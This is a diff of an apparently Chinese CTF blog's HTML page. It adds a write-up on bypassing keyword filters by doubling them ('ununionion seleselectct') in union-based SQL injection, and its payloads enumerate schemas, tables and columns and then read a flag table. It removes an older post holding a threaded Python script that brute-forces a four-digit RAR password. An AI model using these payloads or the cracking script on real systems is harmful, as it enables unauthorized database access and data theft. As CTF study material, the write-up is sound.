@@ -172,6 +172,74 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-双写绕过(联合注入)" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/" class="article-date">
+  	<time datetime="2021-08-26T16:00:00.000Z" itemprop="datePublished">2021-08-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/">
+        双写绕过(联合注入)
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h1><p>通过在username和password中构造可疑闭合点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：admin&#x27;、admin&quot;、admin&quot;)、admin&#x27;)</span><br><span class="line"></span><br><span class="line">password：admin&#x27;、admin&quot;、admin&quot;)、admin&#x27;)</span><br></pre></td></tr></table></figure>
+<p>发现注入点在password，且闭合是单引号，我们可以通过双写绕过的方式来进行联合注入</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">admin&#x27; ununionion seleselectct group_concat(schema_name),group_concat(schema_name),group_concat(schema_name) frfromom infoorrmation_schema.schemata limit 1 offset 0--+</span><br><span class="line"></span><br><span class="line">报数据表</span><br><span class="line">admin&#x27; ununionion seleselectct group_concat(table_name),group_concat(table_name),group_concat(table_name) frfromom infoorrmation_schema.tables limit 1 offset 0%23</span><br><span class="line">admin&#x27; ununionion seleselectct table_name,table_name,table_name frfromom infoorrmation_schema.tables limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">报数据列</span><br><span class="line">admin&#x27; ununionion seleselectct column_name,column_name,column_name frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;Flag&#x27; limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据列中的内容</span><br><span class="line">admin&#x27; ununionion seleselectct flag,flag,flag frfromom ctf.Flag limit 1 offset 0%23</span><br></pre></td></tr></table></figure>
+<p>其中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit 1 offset 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>的解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select * from table limit 2,1;</span><br><span class="line">//跳过2条取出1条数据，limit后面是从第2条开始读，读取1条信息，即读取第3条数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from table limit 2 offset 1;</span><br><span class="line">//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-报错注入" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -792,68 +860,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-解压爆破(rar)" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/26/%E8%A7%A3%E5%8E%8B%E7%88%86%E7%A0%B4(rar)/" class="article-date">
-  	<time datetime="2021-07-25T16:00:00.000Z" itemprop="datePublished">2021-07-26</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/26/%E8%A7%A3%E5%8E%8B%E7%88%86%E7%A0%B4(rar)/">
-        rar文件爆破解压
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">from unrar import rarfile</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def CreatePwd():</span><br><span class="line">    f = open(&#x27;passdict.txt&#x27;, &#x27;w&#x27;)</span><br><span class="line">    for id in range(10000):</span><br><span class="line">        password = str(id).zfill(4) + &#x27;\n&#x27;</span><br><span class="line">        f.write(password)</span><br><span class="line">    f.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_pwd(dict_path):</span><br><span class="line">    with open(dict_path, &#x27;r&#x27;) as f:</span><br><span class="line">        for pwd in f:</span><br><span class="line">            yield pwd.strip()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def decode_rar(fp, pwd, extract_path, path):</span><br><span class="line">    try:</span><br><span class="line">        fp.extractall(extract_path, pwd=pwd) #解压文件，extract_path为解压路径，pwd为解压密码</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">        # print(&#x27;【ERROR】&#x27;, pwd)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;the pwd is&gt;&#x27;, pwd)</span><br><span class="line">        os._exit(0)  #终止程序</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    CreatePwd()</span><br><span class="line">    extract_path = &#x27;flag.txt&#x27;</span><br><span class="line">    dict_path = &#x27;passdict.txt&#x27;</span><br><span class="line">    path=&#x27;1.php&#x27;</span><br><span class="line">    filename = &#x27;基础破解.rar&#x27;</span><br><span class="line">    fp = rarfile.RarFile(filename) #待解压文件</span><br><span class="line">    pwds = get_pwd(dict_path)</span><br><span class="line">    &#x27;&#x27;&#x27;使用多线程可提高速度&#x27;&#x27;&#x27;</span><br><span class="line">    # for pwd in pwds:</span><br><span class="line">    #     decode_rar(fp, pwd, extract_path)</span><br><span class="line">    for pwd in pwds:</span><br><span class="line">        t = Thread(target=decode_rar, args=(fp, pwd, extract_path,path))</span><br><span class="line">        t.start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>由于rarfile库需要unrar系统文件，所以需要在<a target="_blank" rel="noopener" href="http://www.rarlab.com/rar/UnRARDLL.exe%E4%B8%8B%E8%BD%BDUnRARDLL.exe%E8%BD%AF%E4%BB%B6%EF%BC%8C%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E4%BF%AE%E6%94%B9x64%E4%B8%AD%E7%9A%84%E4%B8%A4%E4%B8%AA%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%BAunrar%EF%BC%8C%E5%B9%B6%E5%B0%86x64%E6%96%87%E4%BB%B6%E5%A4%B9%E8%B7%AF%E5%BE%84%E5%86%99%E5%85%A5%E5%88%B0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84path%E4%B8%AD%E5%8D%B3%E5%8F%AF%E3%80%82">http://www.rarlab.com/rar/UnRARDLL.exe下载UnRARDLL.exe软件，安装成功后，修改x64中的两个系统文件为unrar，并将x64文件夹路径写入到环境变量的path中即可。</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
 	</div>
 
       
